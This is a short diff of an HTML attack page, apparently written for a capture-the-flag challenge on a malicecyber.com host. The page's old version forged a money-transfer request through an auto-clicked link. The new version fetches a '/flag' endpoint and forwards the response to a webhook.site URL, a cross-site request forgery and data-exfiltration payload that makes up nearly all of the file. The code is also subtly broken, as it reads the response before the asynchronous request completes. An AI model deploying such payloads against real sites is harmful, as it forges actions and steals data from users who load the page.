@@ -1,6 +1,12 @@
 <html>
-<a id='evilAnchor' href='https://upcredit4.chall.malicecyber.com/transfer?account=UdR_3v0qX&amount=500'></a>
- <script>    
+<a id='evilAnchor' href='https://upcredit4.chall.malicecyber.com/flag'></a>
+ <script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://upcredit4.chall.malicecyber.com/flag');
+  xhr.send();
+  var xhr2 = new XMLHttpRequest();
+  xhr2.open('GET', 'https://webhook.site/b0062056-f338-4b5a-a2fb-044aa09f1644?flag=' + xhr.response);
+  xhr2.send();
   setTimeout(() => { 
    document.getElementById('evilAnchor').click();
   }, 1000);
